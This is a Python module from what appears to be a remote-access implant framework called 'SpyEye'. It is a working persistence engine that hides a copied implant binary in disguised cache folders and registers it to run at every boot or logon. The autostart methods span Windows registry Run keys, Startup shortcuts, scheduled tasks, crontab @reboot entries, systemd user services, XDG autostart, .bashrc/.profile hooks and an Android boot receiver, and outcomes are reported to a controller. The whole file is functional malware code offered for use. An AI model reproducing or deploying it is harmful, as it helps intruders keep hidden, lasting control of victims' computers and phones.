"""
modules/persistence.py

Advanced Multi-Platform System Persistence & Implant Resiliency Engine for SpyEye Framework v3.1.
  - Orchestrates automated autostart configurations across Windows, Linux, and Android environments.
  - Implements multi-vector redundancy techniques to ensure continuous C2 connectivity and process resurrection.
  - Utilizes stealth concealment mechanisms including file attributes modification and hidden directory structuring.
"""

import logging
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from typing import Any, Dict, List, Optional, Tuple

from modules.base import BaseModule

logger = logging.getLogger(__name__)


class PersistenceModule(BaseModule):
    """
    Establishes, verifies, and maintains persistent execution vectors on targeted systems.

    Configuration Parameters:
        technique (str): Specific persistence strategy or "all" to deploy multi-vector coverage (default: "all")
        exe_path (str): File system path to the core implant binary to duplicate and persist (default: sys.executable)
        payload_url (str): Remote fallback endpoint URL to retrieve binary payloads if local source validation fails
        install_dir (str): Dedicated destination file system directory for covert binary placement (default: auto-resolved)
        service_name (str): Unique identifier string for tasks, registry keys, and service registrations (default: "SpyEyeService")
        interval_minutes (int): Health-check and background verification loop interval in minutes (default: 60)
        platform (str): Operating system target specifier ("windows" | "android" | "linux")
    """

    def __init__(self, target_id: str, config: Optional[Dict[str, Any]] = None):
        super().__init__(target_id, config)
        self._result_callback = None
        self._platform = self.config.get("platform", sys.platform)

    def validate_config(self) -> bool:
        """Validate optional persistence parameters for malformed inputs."""
        interval = self.config.get("interval_minutes", 60)
        if isinstance(interval, int) and interval <= 0:
            logger.error("[%s] Interval parameter must be greater than zero.", self._module_name)
            return False
        return True

    def set_result_callback(self, callback) -> None:
        """Inject real-time telemetry transmission handler."""
        self._result_callback = callback

    def run(self) -> None:
        """Execute the persistence installation sequence across all applicable techniques."""
        technique = self.config.get("technique", "all")
        exe_path = self.config.get("exe_path", sys.executable)
        service_name = self.config.get("service_name", "SpyEyeService")

        logger.info(
            "[%s] Launching persistence deployment — Platform: %s | Technique: %s | Binary: %s",
            self._module_name, self._platform, technique, exe_path,
        )

        results: Dict[str, Any] = {
            "platform": self._platform,
            "techniques_attempted": [],
            "techniques_succeeded": [],
            "install_path": "",
        }

        # Windows Persistence Vectors
        if technique == "all" or technique == "registry":
            if self._is_windows():
                ok, path = self._registry_persistence(service_name, exe_path)
                results["techniques_attempted"].append("registry")
                if ok:
                    results["techniques_succeeded"].append("registry")
                    results["install_path"] = path or results["install_path"]

        if technique == "all" or technique == "startup":
            if self._is_windows():
                ok, path = self._startup_folder_persistence(service_name, exe_path)
                results["techniques_attempted"].append("startup_folder")
                if ok:
                    results["techniques_succeeded"].append("startup_folder")
                    results["install_path"] = path or results["install_path"]

        if technique == "all" or technique == "scheduled_task":
            if self._is_windows():
                ok = self._scheduled_task_persistence(service_name, exe_path)
                results["techniques_attempted"].append("scheduled_task")
                if ok:
                    results["techniques_succeeded"].append("scheduled_task")

        # Linux Persistence Vectors
        if technique == "all" or technique == "crontab":
            if not self._is_windows():
                ok, path = self._crontab_persistence(service_name, exe_path)
                results["techniques_attempted"].append("crontab")
                if ok:
                    results["techniques_succeeded"].append("crontab")
                    results["install_path"] = path or results["install_path"]

        if technique == "all" or technique == "systemd":
            if not self._is_windows() and self._has_systemd():
                ok = self._systemd_persistence(service_name, exe_path)
                results["techniques_attempted"].append("systemd")
                if ok:
                    results["techniques_succeeded"].append("systemd")

        if technique == "all" or technique == "xdg_autostart":
            if not self._is_windows():
                ok, path = self._xdg_autostart_persistence(service_name, exe_path)
                results["techniques_attempted"].append("xdg_autostart")
                if ok:
                    results["techniques_succeeded"].append("xdg_autostart")
                    results["install_path"] = path or results["install_path"]

        if technique == "all" or technique == "bashrc":
            if not self._is_windows():
                ok = self._bashrc_persistence(service_name, exe_path)
                results["techniques_attempted"].append("bashrc")
                if ok:
                    results["techniques_succeeded"].append("bashrc")

        # Android Persistence Vectors
        if self._platform == "android" or technique == "android_boot_receiver":
            ok = self._android_persistence(service_name)
            results["techniques_attempted"].append("android_boot_receiver")
            if ok:
                results["techniques_succeeded"].append("android_boot_receiver")

        results["success_count"] = len(results["techniques_succeeded"])
        results["attempt_count"] = len(results["techniques_attempted"])

        self._emit_result(results)
        logger.info(
            "[%s] Persistence deployment completed: %d/%d techniques successfully established.",
            self._module_name, results["success_count"], results["attempt_count"],
        )

    # ─── Windows Techniques ──────────────────────────────────────────

    def _is_windows(self) -> bool:
        return self._platform.startswith("win") or sys.platform.startswith("win")

    def _registry_persistence(self, service_name: str, exe_path: str) -> Tuple[bool, Optional[str]]:
        """Inject executable path into HKCU Run registry key."""
        try:
            import winreg

            install_path = self._install_binary(exe_path, service_name)
            if not install_path:
                return False, None

            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(key, service_name, 0, winreg.REG_SZ, install_path)
            winreg.CloseKey(key)

            logger.info("[%s] Registry run key successfully populated: %s -> %s", self._module_name, service_name, install_path)
            return True, install_path
        except Exception as exc:
            logger.warning("[%s] Registry persistence vector failed: %s", self._module_name, exc)
            return False, None

    def _startup_folder_persistence(self, service_name: str, exe_path: str) -> Tuple[bool, Optional[str]]:
        """Deploy shortcut or binary replica into the user Startup directory."""
        try:
            import win32com.client

            install_path = self._install_binary(exe_path, service_name)
            if not install_path:
                return False, None

            shell = win32com.client.Dispatch("WScript.Shell")
            startup_folder = shell.SpecialFolders("Startup")

            shortcut_path = os.path.join(startup_folder, f"{service_name}.lnk")
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.TargetPath = install_path
            shortcut.WorkingDirectory = os.path.dirname(install_path)
            shortcut.WindowStyle = 7  # Minimized execution window
            shortcut.Save()

            logger.info("[%s] Startup folder shortcut successfully generated: %s", self._module_name, shortcut_path)
            return True, install_path
        except ImportError:
            logger.warning("[%s] win32com runtime library missing — attempting direct file copy fallback.", self._module_name)
            try:
                startup_paths = [
                    os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"),
                    os.path.expandvars(r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup"),
                ]
                for startup_path in startup_paths:
                    if os.path.isdir(startup_path):
                        dest = os.path.join(startup_path, f"{service_name}.exe")
                        shutil.copy2(exe_path, dest)
                        logger.info("[%s] Copied binary directly to Startup directory: %s", self._module_name, dest)
                        return True, dest
            except Exception as exc2:
                logger.warning("[%s] Startup folder direct copy fallback failed: %s", self._module_name, exc2)
            return False, None
        except Exception as exc:
            logger.warning("[%s] Startup folder persistence vector failed: %s", self._module_name, exc)
            return False, None

    def _scheduled_task_persistence(self, service_name: str, exe_path: str) -> bool:
        """Register a persistent scheduled task triggered upon user logon."""
        try:
            install_path = self._install_binary(exe_path, service_name)
            if not install_path:
                return False

            task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{time.strftime('%Y-%m-%dT%H:%M:%S')}</Date>
    <Author>{service_name}</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>{os.environ.get('USERNAME', '')}</UserId>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{os.environ.get('USERNAME', '')}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Enabled>true</Enabled>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{install_path}</Command>
      <WorkingDirectory>{os.path.dirname(install_path)}</WorkingDirectory>
    </Exec>
  </Actions>
</Task>"""

            xml_path = os.path.join(tempfile.gettempdir(), f"{service_name}_task.xml")
            with open(xml_path, "w", encoding="utf-16") as f:
                f.write(task_xml)

            subprocess.run(
                ["schtasks", "/create", "/tn", service_name, "/xml", xml_path, "/f"],
                capture_output=True, timeout=10,
            )

            try:
                os.remove(xml_path)
            except Exception:
                pass

            logger.info("[%s] Windows Scheduled Task successfully registered: %s", self._module_name, service_name)
            return True
        except Exception as exc:
            logger.warning("[%s] Scheduled task persistence vector failed: %s", self._module_name, exc)
            return False

    # ─── Linux Techniques ────────────────────────────────────────────

    def _has_systemd(self) -> bool:
        try:
            result = subprocess.run(
                ["systemctl", "--version"],
                capture_output=True, timeout=3,
            )
            return result.returncode == 0
        except Exception:
            return False

    def _crontab_persistence(self, service_name: str, exe_path: str) -> Tuple[bool, Optional[str]]:
        """Inject an @reboot entry into the local user crontab table."""
        try:
            install_path = self._install_binary(exe_path, service_name)
            if not install_path:
                return False, None

            result = subprocess.run(
                ["crontab", "-l"],
                capture_output=True, text=True, timeout=5,
            )
            existing = result.stdout if result.returncode == 0 else ""

            if service_name in existing:
                logger.info("[%s] Crontab persistence entry already exists for %s", self._module_name, service_name)
                return True, install_path

            new_cron = existing.strip()
            if new_cron and not new_cron.endswith("\n"):
                new_cron += "\n"
            new_cron += f"@reboot {install_path} --silent &  # {service_name}\n"

            proc = subprocess.run(
                ["crontab", "-"],
                input=new_cron, text=True, capture_output=True, timeout=5,
            )

            if proc.returncode == 0:
                logger.info("[%s] Crontab @reboot entry successfully added: %s", self._module_name, install_path)
                return True, install_path
            else:
                logger.warning("[%s] Crontab installation rejected: %s", self._module_name, proc.stderr)
                return False, None

        except Exception as exc:
            logger.warning("[%s] Crontab persistence vector failed: %s", self._module_name, exc)
            return False, None

    def _systemd_persistence(self, service_name: str, exe_path: str) -> bool:
        """Construct and register a user-level systemd service daemon."""
        try:
            install_path = self._install_binary(exe_path, service_name)
            if not install_path:
                return False

            service_dir = os.path.expanduser("~/.config/systemd/user")
            os.makedirs(service_dir, exist_ok=True)

            service_path = os.path.join(service_dir, f"{service_name}.service")
            service_content = f"""[Unit]
Description={service_name} - System Resiliency Service
After=network.target

[Service]
ExecStart={install_path}
Restart=on-failure
RestartSec=30
Type=simple

[Install]
WantedBy=default.target
"""

            with open(service_path, "w") as f:
                f.write(service_content)

            subprocess.run(
                ["systemctl", "--user", "daemon-reload"],
                capture_output=True, timeout=10,
            )
            subprocess.run(
                ["systemctl", "--user", "enable", service_name],
                capture_output=True, timeout=10,
            )

            logger.info("[%s] Systemd user service successfully created and enabled: %s", self._module_name, service_path)
            return True
        except Exception as exc:
            logger.warning("[%s] Systemd persistence vector failed: %s", self._module_name, exc)
            return False

    def _xdg_autostart_persistence(self, service_name: str, exe_path: str) -> Tuple[bool, Optional[str]]:
        """Deploy an XDG desktop entry file into ~/.config/autostart."""
        try:
            install_path = self._install_binary(exe_path, service_name)
            if not install_path:
                return False, None

            autostart_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_dir, exist_ok=True)

            desktop_path = os.path.join(autostart_dir, f"{service_name}.desktop")
            desktop_content = f"""[Desktop Entry]
Type=Application
Name={service_name}
Exec={install_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Terminal=false
"""

            with open(desktop_path, "w") as f:
                f.write(desktop_content)

            os.chmod(desktop_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR)

            logger.info("[%s] XDG autostart entry successfully created: %s", self._module_name, desktop_path)
            return True, install_path
        except Exception as exc:
            logger.warning("[%s] XDG autostart persistence vector failed: %s", self._module_name, exc)
            return False, None

    def _bashrc_persistence(self, service_name: str, exe_path: str) -> bool:
        """Inject invocation hooks into interactive shell resource configuration files."""
        try:
            install_path = self._install_binary(exe_path, service_name)
            if not install_path:
                return False

            bashrc_path = os.path.expanduser("~/.bashrc")
            profile_path = os.path.expanduser("~/.profile")

            line = f"\n# SpyEye persistence hook (do not remove)\n[ -x {install_path} ] && nohup {install_path} --silent >/dev/null 2>&1 &\n"

            for rc_path in [bashrc_path, profile_path]:
                if os.path.isfile(rc_path):
                    with open(rc_path, "r") as f:
                        content = f.read()
                    if service_name not in content:
                        with open(rc_path, "a") as f:
                            f.write(line)
                        logger.info("[%s] Shell resource hook successfully appended to %s", self._module_name, rc_path)

            return True
        except Exception as exc:
            logger.warning("[%s] Shell resource persistence vector failed: %s", self._module_name, exc)
            return False

    # ─── Android Techniques ──────────────────────────────────────────

    def _android_persistence(self, service_name: str) -> bool:
        """Dispatch control signals to the Android agent bridge for broadcast receiver registration."""
        try:
            import requests

            resp = requests.post(
                "http://127.0.0.1:8088/persistence/register",
                json={
                    "service_name": service_name,
                    "enable_boot_receiver": True,
                    "foreground_service": True,
                    "alarm_interval_minutes": int(self.config.get("interval_minutes", 60)),
                },
                timeout=10,
            )

            if resp.status_code == 200:
                logger.info("[%s] Android platform persistence successfully registered via bridge API.", self._module_name)
                return True
            else:
                logger.warning("[%s] Android bridge returned unexpected HTTP status code %d", self._module_name, resp.status_code)
                return False
        except Exception as exc:
            logger.warning("[%s] Android platform persistence registration failed: %s", self._module_name, exc)
            return False

    # ─── Shared Helpers ──────────────────────────────────────────────

    def _install_binary(self, exe_path: str, service_name: str) -> Optional[str]:
        """Securely replicate and conceal the implant binary within system directories."""
        install_dir = self.config.get("install_dir", "")
        if not install_dir:
            if self._is_windows():
                install_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Caches")
            else:
                install_dir = os.path.expanduser("~/.cache/.systemd")

        os.makedirs(install_dir, exist_ok=True)

        ext = ".exe" if self._is_windows() else ""
        dest_name = f".{service_name}{ext}" if not self._is_windows() else f"{service_name}{ext}"
        dest_path = os.path.join(install_dir, dest_name)

        if os.path.isfile(exe_path):
            try:
                if not os.path.isfile(dest_path) or (
                    os.path.getmtime(exe_path) > os.path.getmtime(dest_path)
                ):
                    shutil.copy2(exe_path, dest_path)
                    logger.info("[%s] Implant binary successfully installed to destination: %s", self._module_name, dest_path)

                if self._is_windows():
                    try:
                        import ctypes
                        ctypes.windll.kernel32.SetFileAttributesW(
                            dest_path, 2  # FILE_ATTRIBUTE_HIDDEN flag
                        )
                    except Exception:
                        pass
                else:
                    os.chmod(dest_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR)

                return dest_path
            except Exception as exc:
                logger.warning("[%s] Binary file installation routine failed: %s", self._module_name, exc)
                return None
        else:
            logger.warning("[%s] Source implant binary could not be located at path: %s", self._module_name, exe_path)
            return None

    # ─── Emit Helpers ────────────────────────────────────────────────

    def _emit_result(self, data: Dict[str, Any]) -> None:
        payload = {
            "target_id": self.target_id,
            "module": "persistence",
            "action": "result",
            "data": data,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            logger.info(
                "[%s] Persistence execution summary: %d/%d vectors active on target platform %s",
                self._module_name,
                data.get("success_count", 0),
                data.get("attempt_count", 0),
                self._platform,
            )

    def _emit_error(self, message: str) -> None:
        payload = {
            "target_id": self.target_id,
            "module": "persistence",
            "action": "error",
            "message": message,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            logger.error("[%s] Error notification: %s", self._module_name, message)